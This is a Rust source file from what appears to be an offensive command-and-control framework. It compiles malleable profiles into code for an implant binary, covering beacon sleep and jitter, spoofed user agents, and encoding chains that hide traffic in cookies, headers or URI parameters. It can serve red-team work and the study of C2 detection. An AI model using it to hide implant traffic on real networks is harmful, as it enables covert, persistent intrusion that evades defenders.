//! Profile Compiler - Generates Rust source code from malleable profiles
//!
//! Converts TOML profile definitions into compile-time constants that are
//! baked into the implant binary, eliminating runtime parsing overhead.

use crate::profile::*;

/// Compile a malleable profile into Rust source code
pub fn compile_profile(profile: &MalleableProfile) -> String {
    let mut output = String::new();

    output.push_str("// Auto-generated malleable profile\n");
    output.push_str("// DO NOT EDIT - generated from profile TOML\n\n");
    output.push_str(&format!("// Profile: {}\n", profile.name));
    output.push_str(&format!("// Description: {}\n\n", profile.description));

    // Generate profile constants
    output.push_str("pub mod profile {\n");
    output.push_str("    use super::*;\n\n");

    // Profile name
    output.push_str(&format!(
        "    pub const NAME: &str = \"{}\";\n",
        escape_string(&profile.name)
    ));

    // Global settings
    output.push_str("\n    // Global settings\n");
    output.push_str(&format!(
        "    pub const JITTER: u8 = {};\n",
        profile.global.jitter
    ));
    output.push_str(&format!(
        "    pub const SLEEPTIME: u32 = {};\n",
        profile.global.sleeptime
    ));
    output.push_str(&format!(
        "    pub const USER_AGENT: &str = \"{}\";\n",
        escape_string(&profile.global.useragent)
    ));
    output.push_str(&format!(
        "    pub const DATA_JITTER: u8 = {};\n",
        profile.global.data_jitter
    ));

    // HTTP GET configuration
    output.push_str("\n    // HTTP GET transaction\n");
    output.push_str("    pub mod http_get {\n");
    compile_http_settings(&mut output, &profile.http_get, "        ");
    output.push_str("    }\n");

    // HTTP POST configuration
    output.push_str("\n    // HTTP POST transaction\n");
    output.push_str("    pub mod http_post {\n");
    compile_http_settings(&mut output, &profile.http_post, "        ");
    output.push_str("    }\n");

    output.push_str("}\n\n");

    // Generate transform functions
    output.push_str("// Transform implementation\n");
    output.push_str(&generate_transform_impl(profile));

    // Generate the runtime profile struct
    output.push_str(&generate_runtime_profile(profile));

    output
}

fn compile_http_settings(output: &mut String, settings: &HttpSettings, indent: &str) {
    // URIs
    output.push_str(&format!("{}pub const URIS: &[&str] = &[\n", indent));
    for uri in &settings.uris {
        output.push_str(&format!("{}    \"{}\",\n", indent, escape_string(uri)));
    }
    output.push_str(&format!("{}];\n", indent));

    // Verb
    output.push_str(&format!(
        "{}pub const VERB: &str = \"{}\";\n",
        indent,
        escape_string(&settings.verb)
    ));

    // Headers
    output.push_str(&format!(
        "{}pub const HEADERS: &[(&str, &str)] = &[\n",
        indent
    ));
    for header in &settings.headers {
        output.push_str(&format!(
            "{}    (\"{}\", \"{}\"),\n",
            indent,
            escape_string(&header.name),
            escape_string(&header.value)
        ));
    }
    output.push_str(&format!("{}];\n", indent));

    // Transform chain
    output.push_str(&format!(
        "{}pub const CLIENT_TRANSFORMS: &[TransformOp] = &[\n",
        indent
    ));
    for transform in &settings.client.transforms {
        output.push_str(&format!(
            "{}    {},\n",
            indent,
            compile_transform(transform)
        ));
    }
    output.push_str(&format!("{}];\n", indent));

    // Output location
    output.push_str(&format!(
        "{}pub const CLIENT_OUTPUT: OutputLoc = {};\n",
        indent,
        compile_output_location(&settings.client.output)
    ));

    // Server transforms
    output.push_str(&format!(
        "{}pub const SERVER_TRANSFORMS: &[TransformOp] = &[\n",
        indent
    ));
    for transform in &settings.server.transforms {
        output.push_str(&format!(
            "{}    {},\n",
            indent,
            compile_transform(transform)
        ));
    }
    output.push_str(&format!("{}];\n", indent));

    output.push_str(&format!(
        "{}pub const SERVER_OUTPUT: OutputLoc = {};\n",
        indent,
        compile_output_location(&settings.server.output)
    ));
}

fn compile_transform(transform: &TransformStep) -> String {
    match transform {
        TransformStep::Base64 => "TransformOp::Base64".to_string(),
        TransformStep::Base64Url => "TransformOp::Base64Url".to_string(),
        TransformStep::Hex => "TransformOp::Hex".to_string(),
        TransformStep::Xor { key } => {
            format!("TransformOp::Xor {{ key: &hex_literal::hex!(\"{}\") }}", key)
        }
        TransformStep::Prepend { data } => {
            format!(
                "TransformOp::Prepend {{ data: \"{}\" }}",
                escape_string(data)
            )
        }
        TransformStep::Append { data } => {
            format!(
                "TransformOp::Append {{ data: \"{}\" }}",
                escape_string(data)
            )
        }
        TransformStep::NetBios => "TransformOp::NetBios".to_string(),
        TransformStep::NetBiosLower => "TransformOp::NetBiosLower".to_string(),
        TransformStep::Mask => "TransformOp::Mask".to_string(),
        TransformStep::Reverse => "TransformOp::Reverse".to_string(),
    }
}

fn compile_output_location(output: &OutputLocation) -> String {
    match output {
        OutputLocation::Body => "OutputLoc::Body".to_string(),
        OutputLocation::UriParam { name } => {
            format!("OutputLoc::UriParam {{ name: \"{}\" }}", escape_string(name))
        }
        OutputLocation::Header { name } => {
            format!("OutputLoc::Header {{ name: \"{}\" }}", escape_string(name))
        }
        OutputLocation::Cookie { name } => {
            format!("OutputLoc::Cookie {{ name: \"{}\" }}", escape_string(name))
        }
        OutputLocation::Print => "OutputLoc::Print".to_string(),
    }
}

fn escape_string(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

fn generate_transform_impl(_profile: &MalleableProfile) -> String {
    r#"
/// Transform operation (compile-time enum)
#[derive(Debug, Clone, Copy)]
pub enum TransformOp {
    Base64,
    Base64Url,
    Hex,
    Xor { key: &'static [u8] },
    Prepend { data: &'static str },
    Append { data: &'static str },
    NetBios,
    NetBiosLower,
    Mask,
    Reverse,
}

/// Output location for transformed data
#[derive(Debug, Clone, Copy)]
pub enum OutputLoc {
    Body,
    UriParam { name: &'static str },
    Header { name: &'static str },
    Cookie { name: &'static str },
    Print,
}

impl TransformOp {
    /// Apply transform to data (encode direction)
    pub fn encode(&self, data: &[u8]) -> Vec<u8> {
        match self {
            TransformOp::Base64 => {
                use base64::{Engine, engine::general_purpose::STANDARD};
                STANDARD.encode(data).into_bytes()
            }
            TransformOp::Base64Url => {
                use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
                URL_SAFE_NO_PAD.encode(data).into_bytes()
            }
            TransformOp::Hex => {
                hex::encode(data).into_bytes()
            }
            TransformOp::Xor { key } => {
                data.iter()
                    .enumerate()
                    .map(|(i, b)| b ^ key[i % key.len()])
                    .collect()
            }
            TransformOp::Prepend { data: prefix } => {
                let mut result = prefix.as_bytes().to_vec();
                result.extend_from_slice(data);
                result
            }
            TransformOp::Append { data: suffix } => {
                let mut result = data.to_vec();
                result.extend_from_slice(suffix.as_bytes());
                result
            }
            TransformOp::NetBios => {
                // NetBIOS encode: each byte becomes two chars (uppercase)
                let mut result = Vec::with_capacity(data.len() * 2);
                for &b in data {
                    result.push(b'A' + (b >> 4));
                    result.push(b'A' + (b & 0x0F));
                }
                result
            }
            TransformOp::NetBiosLower => {
                // NetBIOS encode: each byte becomes two chars (lowercase)
                let mut result = Vec::with_capacity(data.len() * 2);
                for &b in data {
                    result.push(b'a' + (b >> 4));
                    result.push(b'a' + (b & 0x0F));
                }
                result
            }
            TransformOp::Mask => {
                // Generate random key and prepend it
                // In actual impl, use proper RNG
                let key = [0x41u8; 4]; // Placeholder - real impl uses random
                let mut result = key.to_vec();
                for (i, &b) in data.iter().enumerate() {
                    result.push(b ^ key[i % key.len()]);
                }
                result
            }
            TransformOp::Reverse => {
                data.iter().rev().copied().collect()
            }
        }
    }

    /// Apply transform to data (decode direction)
    pub fn decode(&self, data: &[u8]) -> Result<Vec<u8>, &'static str> {
        match self {
            TransformOp::Base64 => {
                use base64::{Engine, engine::general_purpose::STANDARD};
                STANDARD.decode(data).map_err(|_| "base64 decode failed")
            }
            TransformOp::Base64Url => {
                use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
                URL_SAFE_NO_PAD.decode(data).map_err(|_| "base64url decode failed")
            }
            TransformOp::Hex => {
                hex::decode(data).map_err(|_| "hex decode failed")
            }
            TransformOp::Xor { key } => {
                // XOR is symmetric
                Ok(self.encode(data))
            }
            TransformOp::Prepend { data: prefix } => {
                let prefix_bytes = prefix.as_bytes();
                if data.starts_with(prefix_bytes) {
                    Ok(data[prefix_bytes.len()..].to_vec())
                } else {
                    Err("prepend marker not found")
                }
            }
            TransformOp::Append { data: suffix } => {
                let suffix_bytes = suffix.as_bytes();
                if data.ends_with(suffix_bytes) {
                    Ok(data[..data.len() - suffix_bytes.len()].to_vec())
                } else {
                    Err("append marker not found")
                }
            }
            TransformOp::NetBios | TransformOp::NetBiosLower => {
                if data.len() % 2 != 0 {
                    return Err("invalid netbios length");
                }
                let base = if matches!(self, TransformOp::NetBios) { b'A' } else { b'a' };
                let mut result = Vec::with_capacity(data.len() / 2);
                for chunk in data.chunks(2) {
                    let high = chunk[0].wrapping_sub(base);
                    let low = chunk[1].wrapping_sub(base);
                    if high > 15 || low > 15 {
                        return Err("invalid netbios character");
                    }
                    result.push((high << 4) | low);
                }
                Ok(result)
            }
            TransformOp::Mask => {
                if data.len() < 4 {
                    return Err("mask data too short");
                }
                let key = &data[0..4];
                let masked = &data[4..];
                Ok(masked.iter()
                    .enumerate()
                    .map(|(i, &b)| b ^ key[i % key.len()])
                    .collect())
            }
            TransformOp::Reverse => {
                Ok(data.iter().rev().copied().collect())
            }
        }
    }
}

/// Apply a chain of transforms
pub fn apply_transforms(data: &[u8], transforms: &[TransformOp]) -> Vec<u8> {
    let mut result = data.to_vec();
    for transform in transforms {
        result = transform.encode(&result);
    }
    result
}

/// Reverse a chain of transforms (decode)
pub fn reverse_transforms(data: &[u8], transforms: &[TransformOp]) -> Result<Vec<u8>, &'static str> {
    let mut result = data.to_vec();
    // Apply in reverse order
    for transform in transforms.iter().rev() {
        result = transform.decode(&result)?;
    }
    Ok(result)
}
"#
    .to_string()
}

fn generate_runtime_profile(profile: &MalleableProfile) -> String {
    format!(
        r#"
/// Runtime profile configuration
pub static MALLEABLE_PROFILE: MalleableProfileRuntime = MalleableProfileRuntime {{
    name: "{}",
    jitter: {},
    sleeptime: {},
    user_agent: "{}",
    data_jitter: {},
    http_get: HttpTransaction {{
        uris: profile::http_get::URIS,
        verb: profile::http_get::VERB,
        headers: profile::http_get::HEADERS,
        client_transforms: profile::http_get::CLIENT_TRANSFORMS,
        client_output: profile::http_get::CLIENT_OUTPUT,
        server_transforms: profile::http_get::SERVER_TRANSFORMS,
        server_output: profile::http_get::SERVER_OUTPUT,
    }},
    http_post: HttpTransaction {{
        uris: profile::http_post::URIS,
        verb: profile::http_post::VERB,
        headers: profile::http_post::HEADERS,
        client_transforms: profile::http_post::CLIENT_TRANSFORMS,
        client_output: profile::http_post::CLIENT_OUTPUT,
        server_transforms: profile::http_post::SERVER_TRANSFORMS,
        server_output: profile::http_post::SERVER_OUTPUT,
    }},
}};

/// Runtime profile structure
pub struct MalleableProfileRuntime {{
    pub name: &'static str,
    pub jitter: u8,
    pub sleeptime: u32,
    pub user_agent: &'static str,
    pub data_jitter: u8,
    pub http_get: HttpTransaction,
    pub http_post: HttpTransaction,
}}

/// HTTP transaction configuration
pub struct HttpTransaction {{
    pub uris: &'static [&'static str],
    pub verb: &'static str,
    pub headers: &'static [(&'static str, &'static str)],
    pub client_transforms: &'static [TransformOp],
    pub client_output: OutputLoc,
    pub server_transforms: &'static [TransformOp],
    pub server_output: OutputLoc,
}}

impl MalleableProfileRuntime {{
    /// Get a random URI for GET requests
    pub fn get_uri(&self, index: usize) -> &'static str {{
        self.http_get.uris.get(index % self.http_get.uris.len()).unwrap_or(&"/")
    }}

    /// Get a random URI for POST requests
    pub fn post_uri(&self, index: usize) -> &'static str {{
        self.http_post.uris.get(index % self.http_post.uris.len()).unwrap_or(&"/")
    }}

    /// Encode data for GET request (client -> server)
    pub fn encode_get(&self, data: &[u8]) -> Vec<u8> {{
        apply_transforms(data, self.http_get.client_transforms)
    }}

    /// Decode GET response (server -> client)
    pub fn decode_get_response(&self, data: &[u8]) -> Result<Vec<u8>, &'static str> {{
        reverse_transforms(data, self.http_get.server_transforms)
    }}

    /// Encode data for POST request (client -> server)
    pub fn encode_post(&self, data: &[u8]) -> Vec<u8> {{
        apply_transforms(data, self.http_post.client_transforms)
    }}

    /// Decode POST response (server -> client)
    pub fn decode_post_response(&self, data: &[u8]) -> Result<Vec<u8>, &'static str> {{
        reverse_transforms(data, self.http_post.server_transforms)
    }}
}}
"#,
        escape_string(&profile.name),
        profile.global.jitter,
        profile.global.sleeptime,
        escape_string(&profile.global.useragent),
        profile.global.data_jitter,
    )
}

/// Load and compile a profile from file
pub fn compile_profile_file(path: &str) -> Result<String, Box<dyn std::error::Error>> {
    let profile = MalleableProfile::from_file(path)?;
    profile.validate().map_err(|e| e.join(", "))?;
    Ok(compile_profile(&profile))
}

/// Write compiled profile to file
pub fn write_compiled_profile(
    profile: &MalleableProfile,
    output_path: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let code = compile_profile(profile);
    std::fs::write(output_path, code)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_compile_default_profile() {
        let profile = MalleableProfile::default();
        let code = compile_profile(&profile);

        assert!(code.contains("pub const NAME:"));
        assert!(code.contains("pub const JITTER:"));
        assert!(code.contains("pub const USER_AGENT:"));
        assert!(code.contains("pub mod http_get"));
        assert!(code.contains("pub mod http_post"));
    }

    #[test]
    fn test_compile_with_transforms() {
        let mut profile = MalleableProfile::default();
        profile.http_get.client.transforms = vec![
            TransformStep::Base64,
            TransformStep::Prepend {
                data: "data=".to_string(),
            },
        ];

        let code = compile_profile(&profile);
        assert!(code.contains("TransformOp::Base64"));
        assert!(code.contains("TransformOp::Prepend"));
    }

    #[test]
    fn test_escape_string() {
        assert_eq!(escape_string("test\"quote"), "test\\\"quote");
        assert_eq!(escape_string("back\\slash"), "back\\\\slash");
        assert_eq!(escape_string("new\nline"), "new\\nline");
    }

    #[test]
    fn test_compile_output_locations() {
        assert_eq!(
            compile_output_location(&OutputLocation::Body),
            "OutputLoc::Body"
        );
        assert_eq!(
            compile_output_location(&OutputLocation::Cookie {
                name: "session".to_string()
            }),
            "OutputLoc::Cookie { name: \"session\" }"
        );
    }
}
